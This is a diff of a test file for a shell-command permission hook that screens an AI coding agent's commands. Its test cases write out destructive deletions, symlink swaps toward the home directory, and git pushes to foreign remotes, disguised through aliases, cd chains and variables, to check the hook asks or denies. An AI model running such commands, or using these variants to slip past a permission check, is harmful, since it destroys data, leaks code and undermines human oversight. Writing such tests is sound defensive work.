@@ -155,10 +155,10 @@ def test_entry_shims():
         'import sys, json\nsys.path.insert(0, %r)\n'
         'import pretool_safety, permission_learner\n'
         'from smart_permissions import core, learner\n'
-        'pretool_safety.HOOK_CWD = "/x/rebound"\n'
+        'pretool_safety._probe = "/x/rebound"\n'
         'core.evaluate("Read", {"file_path": "/etc/hosts"})\n'
         'print(json.dumps([pretool_safety is core, permission_learner is learner,\n'
-        '                  core.HOOK_CWD, learner.evaluate_bash is core.evaluate_bash,\n'
+        '                  core._probe, learner.evaluate_bash is core.evaluate_bash,\n'
         '                  "urllib.request" in sys.modules, core.SCRIPT_DIR, core.PLUGIN_ROOT]))\n'
     ) % SCRIPT_DIR
     r = subprocess.run([sys.executable, '-c', probe], capture_output=True, text=True, env=env)
@@ -260,14 +260,18 @@ def _manual_install_checks(dest, pkg, env):
     check('manual install: no bytecode cache could be written', os.path.exists(os.path.join(pkg, '__pycache__')), False)
 
 
-_LEAF_MODULES = ('config', 'judge', 'log', 'util', 'holds')
+_LEAF_MODULES = ('config', 'judge', 'log', 'util', 'holds', 'state')
+# What each leaf may import from the package (default: config only)
+_LEAF_IMPORTS = {'config': set(), 'state': set()}
+# Leaf names core must not hold: a copy of the active state would go stale
+_LEAF_PRIVATE = {'state': {'_active'}}
 
 
 def test_package_modules():
     """The modules core is built on import nothing from core or the learner
-    (only config, which imports nothing from the package), and core
-    re-exports every name they hold as the same object, so `core.X` keeps
-    reaching the code that moved."""
+    (only the leaves _LEAF_IMPORTS allows), and core re-exports every name
+    they hold as the same object, so `core.X` keeps reaching the code that
+    moved. No memoized function reaches the per-call state."""
     print('\n--- Package modules ---')
     import ast
     pkg = os.path.join(SCRIPT_DIR, 'smart_permissions')
@@ -279,9 +283,26 @@ def test_package_modules():
         with open(os.path.join(pkg, name + '.py')) as f:
             tree = ast.parse(f.read())
         rel = {n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.level}
-        allowed = set() if name == 'config' else {'config'}
+        allowed = _LEAF_IMPORTS.get(name, {'config'})
         check(f'{name}.py imports from the package only {sorted(allowed) or "nothing"}',
               sorted(rel - allowed), [])
+    # A memoized answer must depend on its arguments only: no @_memo or
+    # lru_cache function of core reaches current_state, by name, transitively
+    with open(os.path.join(pkg, 'core.py')) as f:
+        tree = ast.parse(f.read())
+    funcs = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
+    memo = sorted(f for f, n in funcs.items()
+                  if any('_memo' in ast.dump(d) or 'lru_cache' in ast.dump(d) for d in n.decorator_list))
+    names = {f: {x.id for x in ast.walk(n) if isinstance(x, ast.Name)}
+             | {x.attr for x in ast.walk(n) if isinstance(x, ast.Attribute)} for f, n in funcs.items()}
+    stateful = {'current_state', 'using_state', 'CallState'}
+    reach = {f for f, ns in names.items() if ns & stateful}
+    grew = True
+    while grew:
+        more = {f for f, ns in names.items() if f not in reach and ns & reach}
+        grew, reach = bool(more), reach | more
+    check(f'no memoized function reaches the call state ({len(memo)} memoized)',
+          (len(memo) > 10, [f for f in memo if f in reach]), (True, []))
     _, cp = _fresh_cfg()
     env = {k: v for k, v in os.environ.items() if not k.startswith('SAFETY_HOOK_')}
     env['SMART_PERMISSIONS_CONFIG'] = cp
@@ -291,11 +312,13 @@ def test_package_modules():
         'out = {}\n'
         'for name in %r:\n'
         '    m = importlib.import_module("smart_permissions." + name)\n'
-        '    names = [k for k, v in vars(m).items()\n'
-        '             if not k.startswith("__") and not isinstance(v, types.ModuleType)]\n'
-        '    out[name] = [len(names), [k for k in names if getattr(core, k, out) is not getattr(m, k)]]\n'
+        '    private = set(%r.get(name, ()))\n'
+        '    names = [k for k, v in vars(m).items() if k not in private\n'
+        '             and not k.startswith("__") and not isinstance(v, types.ModuleType)]\n'
+        '    out[name] = [len(names), [k for k in names if getattr(core, k, out) is not getattr(m, k)]\n'
+        '                 + [k for k in private if hasattr(core, k)]]\n'
         'print(json.dumps(out))\n'
-    ) % (SCRIPT_DIR, _LEAF_MODULES)
+    ) % (SCRIPT_DIR, _LEAF_MODULES, {k: sorted(v) for k, v in _LEAF_PRIVATE.items()})
     r = subprocess.run([sys.executable, '-c', probe], capture_output=True, text=True, env=env)
     try:
         got = json.loads(r.stdout)
@@ -3695,10 +3718,10 @@ def _both_hooks(cmds, files=()):
     code = ("import sys, json\nsys.path.insert(0, %r)\n"
             "from smart_permissions import core as p, learner as l\n"
             "p.log_unknown = lambda *a: None\n"
-            "p.HOOK_CWD = %r\n"
             "out = []\n"
-            "for c in json.loads(sys.stdin.read()):\n"
-            "    out.append(list(p.evaluate_bash(c)) + list(l.classify_bash(c)))\n"
+            "with p.using_state(p.CallState(cwd=%r)):\n"
+            "    for c in json.loads(sys.stdin.read()):\n"
+            "        out.append(list(p.evaluate_bash(c)) + list(l.classify_bash(c)))\n"
             "print(json.dumps(out))\n") % (SCRIPT_DIR, os.path.join(home, 'Dev', 'proj'))
     r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True, env=env,
                        input=json.dumps(cmds))
@@ -4421,148 +4444,148 @@ def test_git_remote_owners():
     real_probe = p._probe
     # No gh login unless a check asks for one, whatever this machine has
     p._probe = lambda argv, path, deadline: None if argv[0] == 'gh' else real_probe(argv, path, deadline)
-    p.set_hook_cwd({'cwd': repo})
-    try:
-        def verdict(cmd):
-            return p.evaluate_bash(cmd, log_unknowns=False)[0]
-
-        check("a stranger's remote goes to the LLM", verdict('git push mirror main'), 'ask')
-        check("with -u too", verdict('git push -u mirror feat'), 'ask')
-        check('origin stays allowed', verdict('git push origin main'), 'allow')
-        check('same owner stays allowed', verdict('git push fork feat'), 'allow')
-        check('a local path stays allowed', verdict('git push backup main'), 'allow')
-        check('a remote not resolved here goes to the LLM', verdict('git push elsewhere main'), 'ask')
-
-        subprocess.run(git + ['remote', 'set-url', '--push', 'origin', 'https://github.com/stranger/x.git'], check=True)
-        check("origin's push URL repointed goes to the LLM", verdict('git push origin main'), 'ask')
-        subprocess.run(git + ['config', '--unset', 'remote.origin.pushurl'], check=True)
-
-        p._probe = lambda argv, path, deadline: 'stranger\n' if argv[0] == 'gh' else real_probe(argv, path, deadline)
-        check('the gh login counts as the developer', verdict('git push mirror main'), 'allow')
-        p._probe = lambda argv, path, deadline: None if argv[0] == 'gh' else real_probe(argv, path, deadline)
-
-        # The other side of two calls: no origin and no login, nothing to compare to
-        bare = tempfile.mkdtemp(prefix='sp-git-noorigin-')
-        atexit.register(shutil.rmtree, bare, ignore_errors=True)
-        subprocess.run(['git', '-C', bare, 'init', '-q'], check=True)
-        subprocess.run(['git', '-C', bare, 'remote', 'add', 'mirror', 'https://github.com/stranger/x.git'], check=True)
-        p.set_hook_cwd({'cwd': bare})
-        check('nothing to compare against goes to the LLM', verdict('git push mirror main'), 'ask')
-        ctx = '\n'.join(p.git_remote_context('git push mirror main', bare, time.monotonic() + 4))
-        check('no owners known: the owner is named', 'Remote mirror github.com/stranger.' in ctx, True)
-        check('no owners known: no mismatch claimed', 'matches none' in ctx, False)
-
-        # Azure DevOps over SSH keeps the organisation in the second segment
-        azure = tempfile.mkdtemp(prefix='sp-git-azure-')
-        atexit.register(shutil.rmtree, azure, ignore_errors=True)
-        subprocess.run(['git', '-C', azure, 'init', '-q'], check=True)
-        for name, url in (('origin', 'git@ssh.dev.azure.com:v3/Me/proj/repo'),
-                          ('other', 'git@ssh.dev.azure.com:v3/Stranger/proj/repo'),
-                          ('mine', 'git@ssh.dev.azure.com:v3/Me/other/repo')):
-            subprocess.run(['git', '-C', azure, 'remote', 'add', name, url], check=True)
-        p.set_hook_cwd({'cwd': azure})
-        check('another Azure organisation goes to the LLM', verdict('git push other main'), 'ask')
-        check('the same Azure organisation stays allowed', verdict('git push mine main'), 'allow')
-        check('a GitHub user named v3 is not read as Azure', p._remote_owner('git@github.com:v3/x.git'), 'github.com/v3')
-        p.set_hook_cwd({'cwd': repo})
-
-        # Git pushes to every push URL, so one stranger among them counts
-        subprocess.run(git + ['remote', 'add', 'multi', 'https://github.com/devowner/a.git'], check=True)
-        for url in ('https://github.com/stranger/x.git', 'https://github.com/devowner/a.git'):
-            subprocess.run(git + ['remote', 'set-url', '--add', '--push', 'multi', url], check=True)
-        check('one stranger among several push URLs', verdict('git push multi main'), 'ask')
-
-        # The owner is read where the command really runs
-        other = tempfile.mkdtemp(prefix='sp-git-other-')
-        atexit.register(shutil.rmtree, other, ignore_errors=True)
-        subprocess.run(['git', '-C', other, 'init', '-q'], check=True)
-        subprocess.run(['git', '-C', other, 'remote', 'add', 'origin', 'https://github.com/devowner/b.git'], check=True)
-        subprocess.run(['git', '-C', other, 'remote', 'set-url', '--push', 'origin',
-                        'https://github.com/stranger/x.git'], check=True)
-        check('cd to a repository with a foreign origin', verdict(f'cd {other} && git push origin main'), 'ask')
-        check('the same inside bash -c', verdict(f"bash -c 'cd {other} && git push origin main'"), 'ask')
-        check('git -C to it', verdict(f'git -C {other} push origin main'), 'ask')
-        for cmd in (f'git --git-dir={other}/.git push origin main', f'GIT_DIR={other}/.git git push origin main',
-                    'cd "$X" && git push origin main'):
-            check(f'a directory not resolved goes to the LLM: {cmd}', verdict(cmd), 'ask')
-        check('cd within the same repository stays allowed', verdict(f'cd {repo} && git push origin main'), 'allow')
-        for cmd in (f'(cd {other}); git push origin main', f'cd {other} | git push origin main',
-                    f'cd {other} & git push origin main'):
-            check(f'a cd that may not move the push goes to the LLM: {cmd}', verdict(cmd), 'ask')
-        # A relative move after another may land anywhere; a function's cd never ran
-        for cmd in (f'if false; then cd {other}; fi; cd rel && git push origin main',
-                    f'function f {{ cd {other}; }}; cd rel && git push origin main',
-                    'git -C x -C y push origin main', f'cd {repo} && cd sub && git push origin main'):
-            check(f'a later relative move goes to the LLM: {cmd}', verdict(cmd), 'ask')
-        p.set_hook_cwd({'cwd': other})
-        check("a function's cd keeps the session directory in view",
-              verdict(f'function f {{ cd {repo}; }}; git push origin main'), 'ask')
-        p.set_hook_cwd({'cwd': repo})
-        check('one relative cd is still plain', verdict('cd . && git push origin main'), 'allow')
-        # Only the directory the command names counts, not the one it left
-        p.set_hook_cwd({'cwd': other})
-        check('a foreign origin it left behind has no say', verdict(f'cd {repo} && git push origin main'), 'allow')
-        p.set_hook_cwd({'cwd': repo})
-        check('a pipe after the cd is fine', verdict(f'cd {repo} && git push origin main 2>&1 | tail -3'), 'allow')
-
-        # Reading a command can evaluate code inside it; that must not walk again
-        calls, real_iter = [], p._iter_commands
-        def counting(command, _depth=0):
-            calls.append(command)
-            return real_iter(command, _depth)
-        p._iter_commands = counting
+    call_state = p.CallState(cwd=repo)
+    with p.using_state(call_state):
         try:
-            verdict("fish -C 'git push origin main' -c 'echo ok'")
+            def verdict(cmd):
+                return p.evaluate_bash(cmd, log_unknowns=False)[0]
+
+            check("a stranger's remote goes to the LLM", verdict('git push mirror main'), 'ask')
+            check("with -u too", verdict('git push -u mirror feat'), 'ask')
+            check('origin stays allowed', verdict('git push origin main'), 'allow')
+            check('same owner stays allowed', verdict('git push fork feat'), 'allow')
+            check('a local path stays allowed', verdict('git push backup main'), 'allow')
+            check('a remote not resolved here goes to the LLM', verdict('git push elsewhere main'), 'ask')
+
+            subprocess.run(git + ['remote', 'set-url', '--push', 'origin', 'https://github.com/stranger/x.git'], check=True)
+            check("origin's push URL repointed goes to the LLM", verdict('git push origin main'), 'ask')
+            subprocess.run(git + ['config', '--unset', 'remote.origin.pushurl'], check=True)
+
+            p._probe = lambda argv, path, deadline: 'stranger\n' if argv[0] == 'gh' else real_probe(argv, path, deadline)
+            check('the gh login counts as the developer', verdict('git push mirror main'), 'allow')
+            p._probe = lambda argv, path, deadline: None if argv[0] == 'gh' else real_probe(argv, path, deadline)
+
+            # The other side of two calls: no origin and no login, nothing to compare to
+            bare = tempfile.mkdtemp(prefix='sp-git-noorigin-')
+            atexit.register(shutil.rmtree, bare, ignore_errors=True)
+            subprocess.run(['git', '-C', bare, 'init', '-q'], check=True)
+            subprocess.run(['git', '-C', bare, 'remote', 'add', 'mirror', 'https://github.com/stranger/x.git'], check=True)
+            call_state.cwd = bare
+            check('nothing to compare against goes to the LLM', verdict('git push mirror main'), 'ask')
+            ctx = '\n'.join(p.git_remote_context('git push mirror main', bare, time.monotonic() + 4))
+            check('no owners known: the owner is named', 'Remote mirror github.com/stranger.' in ctx, True)
+            check('no owners known: no mismatch claimed', 'matches none' in ctx, False)
+
+            # Azure DevOps over SSH keeps the organisation in the second segment
+            azure = tempfile.mkdtemp(prefix='sp-git-azure-')
+            atexit.register(shutil.rmtree, azure, ignore_errors=True)
+            subprocess.run(['git', '-C', azure, 'init', '-q'], check=True)
+            for name, url in (('origin', 'git@ssh.dev.azure.com:v3/Me/proj/repo'),
+                              ('other', 'git@ssh.dev.azure.com:v3/Stranger/proj/repo'),
+                              ('mine', 'git@ssh.dev.azure.com:v3/Me/other/repo')):
+                subprocess.run(['git', '-C', azure, 'remote', 'add', name, url], check=True)
+            call_state.cwd = azure
+            check('another Azure organisation goes to the LLM', verdict('git push other main'), 'ask')
+            check('the same Azure organisation stays allowed', verdict('git push mine main'), 'allow')
+            check('a GitHub user named v3 is not read as Azure', p._remote_owner('git@github.com:v3/x.git'), 'github.com/v3')
+            call_state.cwd = repo
+
+            # Git pushes to every push URL, so one stranger among them counts
+            subprocess.run(git + ['remote', 'add', 'multi', 'https://github.com/devowner/a.git'], check=True)
+            for url in ('https://github.com/stranger/x.git', 'https://github.com/devowner/a.git'):
+                subprocess.run(git + ['remote', 'set-url', '--add', '--push', 'multi', url], check=True)
+            check('one stranger among several push URLs', verdict('git push multi main'), 'ask')
+
+            # The owner is read where the command really runs
+            other = tempfile.mkdtemp(prefix='sp-git-other-')
+            atexit.register(shutil.rmtree, other, ignore_errors=True)
+            subprocess.run(['git', '-C', other, 'init', '-q'], check=True)
+            subprocess.run(['git', '-C', other, 'remote', 'add', 'origin', 'https://github.com/devowner/b.git'], check=True)
+            subprocess.run(['git', '-C', other, 'remote', 'set-url', '--push', 'origin',
+                            'https://github.com/stranger/x.git'], check=True)
+            check('cd to a repository with a foreign origin', verdict(f'cd {other} && git push origin main'), 'ask')
+            check('the same inside bash -c', verdict(f"bash -c 'cd {other} && git push origin main'"), 'ask')
+            check('git -C to it', verdict(f'git -C {other} push origin main'), 'ask')
+            for cmd in (f'git --git-dir={other}/.git push origin main', f'GIT_DIR={other}/.git git push origin main',
+                        'cd "$X" && git push origin main'):
+                check(f'a directory not resolved goes to the LLM: {cmd}', verdict(cmd), 'ask')
+            check('cd within the same repository stays allowed', verdict(f'cd {repo} && git push origin main'), 'allow')
+            for cmd in (f'(cd {other}); git push origin main', f'cd {other} | git push origin main',
+                        f'cd {other} & git push origin main'):
+                check(f'a cd that may not move the push goes to the LLM: {cmd}', verdict(cmd), 'ask')
+            # A relative move after another may land anywhere; a function's cd never ran
+            for cmd in (f'if false; then cd {other}; fi; cd rel && git push origin main',
+                        f'function f {{ cd {other}; }}; cd rel && git push origin main',
+                        'git -C x -C y push origin main', f'cd {repo} && cd sub && git push origin main'):
+                check(f'a later relative move goes to the LLM: {cmd}', verdict(cmd), 'ask')
+            call_state.cwd = other
+            check("a function's cd keeps the session directory in view",
+                  verdict(f'function f {{ cd {repo}; }}; git push origin main'), 'ask')
+            call_state.cwd = repo
+            check('one relative cd is still plain', verdict('cd . && git push origin main'), 'allow')
+            # Only the directory the command names counts, not the one it left
+            call_state.cwd = other
+            check('a foreign origin it left behind has no say', verdict(f'cd {repo} && git push origin main'), 'allow')
+            call_state.cwd = repo
+            check('a pipe after the cd is fine', verdict(f'cd {repo} && git push origin main 2>&1 | tail -3'), 'allow')
+
+            # Reading a command can evaluate code inside it; that must not walk again
+            calls, real_iter = [], p._iter_commands
+            def counting(command, _depth=0):
+                calls.append(command)
+                return real_iter(command, _depth)
+            p._iter_commands = counting
+            try:
+                verdict("fish -C 'git push origin main' -c 'echo ok'")
+            finally:
+                p._iter_commands = real_iter
+            check('fish -C does not walk itself over and over', len(calls) < 200, True)
+
+            ctx = '\n'.join(p.git_remote_context(
+                'git remote add n https://github.com/other/y.git && git push n main', repo, time.monotonic() + 4))
+            check('context: origin is the developer\'s', 'Remote origin github.com/devowner is the developer\'s.' in ctx, True)
+            check('context: stranger named', 'Remote mirror github.com/stranger matches none' in ctx, True)
+            check('context: URL in the command', 'URL in the command: github.com/other matches none' in ctx, True)
+            check('context: no credentials', 's3cret' in ctx, False)
+            check('context: refspec is not a URL',
+                  'head' in '\n'.join(p.git_remote_context('git push origin HEAD:main', repo, time.monotonic() + 4)), False)
+
+            for cmd, want in (
+                    ('git remote add m https://github.com/x/y && git push m --all', True),
+                    ('git remote add m https://github.com/x/y; git push m --al', True),
+                    ('git remote add m u\ngit push --mirror m', True),
+                    ('git remote set-url origin https://x.test/y && git push --all', True),
+                    ('git -C /a remote add q u && (git push q --branches)', True),
+                    ('git push https://x.test/y.git --all', True),
+                    ('command git remote add m u && env git push m --all', True),
+                    ('git remote add m u && /usr/bin/git push m --all', True),
+                    ("bash -c 'git remote add m u && git push m --all'", True),
+                    ('git remote add m u && git push --all', True),
+                    ('git remote add --mirror=push m u && git push m', True),
+                    ("git remote add m u && git push m 'refs/heads/*:refs/heads/*'", True),
+                    ('git remote add m u && git -c alias.p=push p m --all', True),
+                    ('git -c alias.p=push p https://x.test/y.git --all', True),
+                    ("git remote add m u && git -c 'alias.p=push --all' p m", True),
+                    ('git -c alias.st=status st && git remote add up u && git fetch up', False),
+                    ('git remote add -t dev m u && git push m --all', True),
+                    ('git remote add -m dev m u && git push m --all', True),
+                    ('git remote add --track dev m u && git push m --all', True),
+                    ('git remote add --mirror=push -t dev m u && git push m', True),
+                    ("git -c 'alias.a=remote add -t dev' a m u && git push m --all", True),
+                    ('git config remote.origin.pushurl https://x.test/y && git push --all', True),
+                    ('git config remote.origin.url https://x.test/y && git push origin --all', True),
+                    ('git config --get remote.origin.url && git push origin --all', False),
+                    ('git remote add m u && git -c alias.push=status push m --all', True),
+                    ("git remote add m u && git -c alias.p=q -c 'alias.q=push --all' p m", True),
+                    ('git remote add m u && git -c alias.a=b -c alias.b=a a m --all', False),
+                    ("git remote add m u && git push m 'refs/heads/release/*:refs/heads/release/*'", False),
+                    ('git remote add --mirror=fetch m u && git push m main', False),
+                    ('git push origin --all', False),
+                    ('git remote add m https://github.com/x/y && git push m main', False),
+                    ('git remote add up https://x.test/y && git fetch up', False)):
+                check(f'bulk push: {cmd!r}', bool(p.human_required_reason('Bash', {'command': cmd})), want)
         finally:
-            p._iter_commands = real_iter
-        check('fish -C does not walk itself over and over', len(calls) < 200, True)
-
-        ctx = '\n'.join(p.git_remote_context(
-            'git remote add n https://github.com/other/y.git && git push n main', repo, time.monotonic() + 4))
-        check('context: origin is the developer\'s', 'Remote origin github.com/devowner is the developer\'s.' in ctx, True)
-        check('context: stranger named', 'Remote mirror github.com/stranger matches none' in ctx, True)
-        check('context: URL in the command', 'URL in the command: github.com/other matches none' in ctx, True)
-        check('context: no credentials', 's3cret' in ctx, False)
-        check('context: refspec is not a URL',
-              'head' in '\n'.join(p.git_remote_context('git push origin HEAD:main', repo, time.monotonic() + 4)), False)
-
-        for cmd, want in (
-                ('git remote add m https://github.com/x/y && git push m --all', True),
-                ('git remote add m https://github.com/x/y; git push m --al', True),
-                ('git remote add m u\ngit push --mirror m', True),
-                ('git remote set-url origin https://x.test/y && git push --all', True),
-                ('git -C /a remote add q u && (git push q --branches)', True),
-                ('git push https://x.test/y.git --all', True),
-                ('command git remote add m u && env git push m --all', True),
-                ('git remote add m u && /usr/bin/git push m --all', True),
-                ("bash -c 'git remote add m u && git push m --all'", True),
-                ('git remote add m u && git push --all', True),
-                ('git remote add --mirror=push m u && git push m', True),
-                ("git remote add m u && git push m 'refs/heads/*:refs/heads/*'", True),
-                ('git remote add m u && git -c alias.p=push p m --all', True),
-                ('git -c alias.p=push p https://x.test/y.git --all', True),
-                ("git remote add m u && git -c 'alias.p=push --all' p m", True),
-                ('git -c alias.st=status st && git remote add up u && git fetch up', False),
-                ('git remote add -t dev m u && git push m --all', True),
-                ('git remote add -m dev m u && git push m --all', True),
-                ('git remote add --track dev m u && git push m --all', True),
-                ('git remote add --mirror=push -t dev m u && git push m', True),
-                ("git -c 'alias.a=remote add -t dev' a m u && git push m --all", True),
-                ('git config remote.origin.pushurl https://x.test/y && git push --all', True),
-                ('git config remote.origin.url https://x.test/y && git push origin --all', True),
-                ('git config --get remote.origin.url && git push origin --all', False),
-                ('git remote add m u && git -c alias.push=status push m --all', True),
-                ("git remote add m u && git -c alias.p=q -c 'alias.q=push --all' p m", True),
-                ('git remote add m u && git -c alias.a=b -c alias.b=a a m --all', False),
-                ("git remote add m u && git push m 'refs/heads/release/*:refs/heads/release/*'", False),
-                ('git remote add --mirror=fetch m u && git push m main', False),
-                ('git push origin --all', False),
-                ('git remote add m https://github.com/x/y && git push m main', False),
-                ('git remote add up https://x.test/y && git fetch up', False)):
-            check(f'bulk push: {cmd!r}', bool(p.human_required_reason('Bash', {'command': cmd})), want)
-    finally:
-        p._probe = real_probe
-        p.set_hook_cwd({'cwd': os.getcwd()})
+            p._probe = real_probe
 
 
 def test_risky_operations_routed():
@@ -5611,259 +5634,259 @@ def test_friction_batch():
         os.makedirs(d_)
     os.symlink(os.path.join(base, 'outside'), os.path.join(pad, 'l'))
     session = {'cwd': repo, 'scratchpad_dir': pad}
-    p.set_hook_cwd(session)
-    try:
-        # 1. Where the scratchpad is: sent, or derived from the transcript
-        uid = os.getuid()
-        check('scratchpad from the hook input', p.HOOK_SCRATCHPAD, pad)
-        check('scratchpad derived from session and transcript', p._session_scratchpad(
-            {'session_id': 'abc-1', 'transcript_path': '/Users/x/.claude/projects/-Users-x-p/abc-1.jsonl'}),
-            os.path.realpath(f'/tmp/claude-{uid}/-Users-x-p/abc-1/scratchpad'))
-        for label, data in (
-                ('transcript of another session', {'session_id': 'abc-1',
-                                                   'transcript_path': '/u/.claude/projects/s/abc-2.jsonl'}),
-                ('a session id with a slash', {'session_id': '../x',
-                                               'transcript_path': '/u/.claude/projects/s/../x.jsonl'}),
-                ('no session at all', {}),
-                ('a scratchpad outside the temp roots', {'scratchpad_dir': '/Users/x/scratchpad'}),
-                ('a scratchpad reached through a link', {'scratchpad_dir': os.path.join(pad, 'l', 'scratchpad')}),
-                ('not named scratchpad', {'scratchpad_dir': os.path.dirname(pad)})):
-            check(f'no scratchpad: {label}', p._session_scratchpad(data), None)
-
-        # 2 and 6. A name set once to a literal is not empty; this session's
-        # scratchpad is deleted by rule
-        expect('own scratchpad', [
-            f'S={pad}; {rmrf} $S/t5', f'S={pad}; {rmrf} "$S/t5"', f'S={pad} && {rmrf} "$S"/t5',
-            f'S={pad}; {rmrf} "${{S:?}}/t5"', f'S={pad}; {rmrf} "${{S:?}}/a/b"',
-            f'find {pad}/t5 -delete', f'cd {pad} && find t5 -delete',
-            f'cd {pad} && {rmrf} t5', f"find {pad}/t5 -name '*.o' -delete"], 'allow')
-        expect('constant, not scratch', [f'S=/opt/sp-x; {rmrf} $S/build', f'k=x; {rmrf} /tmp/$k',
-                                         f'X=x; {rmrf} ~/cache/$X'], 'ask')
-        # a loop name over literal words is never empty inside its body (1.5.0)
-        expect('loop name, not steered', [f'for S in {pad}; do {rmrf} $S/t5; done'], 'ask')
-        expect('still steered', [
-            f'if true; then S={pad}; fi; {rmrf} $S/t5', f'S=$(pwd); {rmrf} $S/t5',
-            f'S={pad}; S=$(pwd); {rmrf} $S/t5', f'S={pad}; read S; {rmrf} $S/t5',
-            f'false || S={pad}; {rmrf} $S/t5',
-            f'S={pad} | cat; {rmrf} $S/t5', f'S={pad}; unset S; {rmrf} $S/t5',
-            f'(S={pad}); {rmrf} $S/t5', f'f() {{ S={pad}; }}; f; {rmrf} $S/t5',
-            f'S={pad}; $E "$Y"; {rmrf} $S/t5', f'{rmrf} $S/t5; S={pad}', f'S=; {rmrf} $S/t5',
-            f'S={pad}; export S; {rmrf} $S/t5', f'S={pad} # c\n{rmrf} $S/t5',
-            f'S={pad}; case x in x) S=;; esac; {rmrf} $S/t5', f'S={pad}; {rmrf} $S/../t5',
-            # shapes Claude Code itself asks about however S was set
-            f'S={pad}; {rmrf} $S/', f'S={pad}; {rmrf} "$S/"', f'S={pad}; {rmrf} $S/*',
-            f'S={pad}; {rmrf} "$S"/*', f'S={pad}; {rmrf} $S/$k', f'X=x; XY=y; {rmrf} "/tmp/$X/$XY"'], 'deny')
-        expect('not this session\'s scratch', [
-            f'S={pad}; {rmrf} "${{S:?}}"', f'S={pad}; {rmrf} "${{S:?}}"/', f'find {pad} -delete',
-            f'find {pad} -name x -delete', f'S={pad_b}; {rmrf} "${{S:?}}/t5"', f'find {pad_b}/t5 -delete',
-            f'S={pad}/..; {rmrf} "${{S:?}}/t5"', f'S={pad}; {rmrf} "${{S:?}}/l/x"',
-            f'find {pad}/l/ -delete', f'find -L {pad}/t5 -delete', f'find {pad}/t5 -follow -delete',
-            f'S={pad}; ln -s ~ $S/n; {rmrf} "${{S:?}}/n/x"', f'{rmrf} "${{S:?}}/t5"',
-            f'if true; then S={pad}; fi; {rmrf} "${{S:?}}/t5"', f'S=$(pwd); {rmrf} "${{S:?}}/t5"',
-            f'find {base}/x -delete', f'IFS=/; S={pad}; find $S/t5 -delete',
-            # a filtered find elsewhere still goes to the LLM, not to a deny
-            'find ~/Documents -name x.o -delete', f'cd "$X" && find {pad}/t5 -delete'], 'ask')
-        p.set_hook_cwd({'cwd': repo})
-        expect('no scratchpad known', [f'S={pad}; {rmrf} "${{S:?}}/t5"', f'find {pad}/t5 -delete'], 'ask')
-        p.set_hook_cwd(session)
-
-        # 2. A word built only from such names is judged written out
-        expect('constant words', ['B=main; git push origin $B', f'R={repo}; git -C $R status',
-                                  'M=755; chmod $M x.sh'], 'allow')
-        expect('built words', ['F=hard; git reset --$F', 'if true; then F=soft; fi; git reset --$F',
-                               'F=$(echo soft); git reset --$F', 'F=soft; F=hard; git reset --$F',
-                               'F=soft; git reset --$F$G', 'git reset --$F'], 'ask')
-        check('a written-out reset keeps its own reason', 'reset --hard' in p.evaluate_bash(
-            'F=hard; git reset --$F', log_unknowns=False)[1], True)
-
-        # 3. Only a cd the structure scopes counts, not a ( in some text
-        heredoc = f"cd {repo} && git commit -qF - <<'EOF'\nfix (x)\nEOF\ngit push origin main"
-        for cmd in (f'cd {repo} && git commit -qm "fix (x)" && git push origin main', heredoc,
-                    f'cd {repo}; echo "a)"; git push origin main'):
-            check(f'cd still followed: {cmd.replace(base, "B")!r}', p._git_command_dirs(cmd, base),
-                  ([repo], True))
-        check('a $(git …) before the cd runs where the command starts', p._git_command_dirs(
-            f'X=$(git rev-parse HEAD); cd {repo} && git push origin main', base), ([base, repo], True))
-        for cmd in (f'(cd {other}); git push', f'{{ cd {other}; }} | cat; git push',
-                    f'if x; then cd {other}; fi; git push', f'cd {other} | git push',
-                    f'cd {other} & git push', f'f() {{ cd {other}; }}; git push',
-                    f'for x in 1; do cd {other}; done; git push', f'bash -c "cd {other}"; git push'):
-            check(f'a scoped cd is doubted: {cmd.replace(base, "B")!r}',
-                  p._git_command_dirs(cmd, base)[1], False)
-
-        # 4. git -c settings that switch something off for one run
-        expect('inert -c', ['git -c core.hooksPath=/dev/null commit -qm x',
-                            'git -c CORE.HOOKSPATH=/dev/null commit -qm x',
-                            'git -c credential.helper= fetch origin'], 'allow')
-        expect('-c that runs something', [
-            'git -c core.hooksPath=/some/dir commit -qm x', 'git -c core.hooksPath=/dev/null/x commit -qm x',
-            'git -c credential.helper=x fetch origin', 'git -c credential.helper fetch origin',
-            'git -c credential.helper=" " fetch origin',
-            'git config core.hooksPath /dev/null', 'git config credential.helper ""'], 'ask')
-
-        # 5. A relative import path in the working folder or a linked worktree
-        tail = 'PYTHONPATH=src python3 -m pytest 2>&1 | tail -5'
-        expect('import path in the project', [f'cd {wt} && {tail}', tail, f'grep -q x y; {tail}',
-                                             f'cd {wt}/sub && {tail}'], 'allow')
-        expect('import path elsewhere', [
-            f'cd {base} && {tail}', f'cd {wt2} && {tail}', f'ln -s /x y; {tail}',
-            f'cd {wt} && PYTHONPATH=../src python3 -m pytest | tail -5',
-            'PYTHONPATH=/tmp/x python3 -m pytest | tail -5', f'(cd {base}); {tail}',
-            f'cd {wt} && git status && {tail}', f'cd "$X" && {tail}'], 'ask')
-
-        # 7. A branch whose tip a remote-tracking ref holds loses nothing
-        expect('branch on a remote', ['git branch -D feat', 'git branch -d -f feat',
-                                      'git branch --delete --force feat',
-                                      f'cd {repo} && git branch -D feat', f'git -C {repo} branch -D feat'],
-               'allow')
-        expect('branch with work only here', [
-            'git branch -D wip', 'git branch -D feat wip', 'git branch -D nosuch',
-            'git branch -D -r origin/feat', 'git branch -D $B', 'B=feat; git branch -D $B x',
-            'cd "$X" && git branch -D feat', f'git -C {other} branch -D feat',
-            f'(cd {other}); git branch -D feat', 'git branch -D --contains HEAD feat',
-            'git branch -D feat..wip'], 'ask')
-
-        # Review fixes: a pass on probed state needs the rest of the command
-        # unable to change it, and paths resolved as the shell resolves them.
-        # C1: the scratchpad itself can be swapped for a link
-        swap = f'S={pad}; mv "$S" "$S-old"; ln -s ~ "$S"; '
-        expect('scratchpad swapped for a link', [f'{swap}{rmrf} "${{S:?}}/Documents"',
-                                                 f'{swap}find "$S/Documents" -delete',
-                                                 f'S={pad}; python3 x.py; {rmrf} "${{S:?}}/t5"'], 'ask')
-        # C2: names the shell sets or ties are no constants
-        expect('special names', ['argv=--dry-run; set --; git clean -f $argv',
-                                 'PS1=-n; prompt=-x; git clean -f $PS1'], 'ask')
-        expect('plain name', ['N=-n; git clean -f $N'], 'allow')
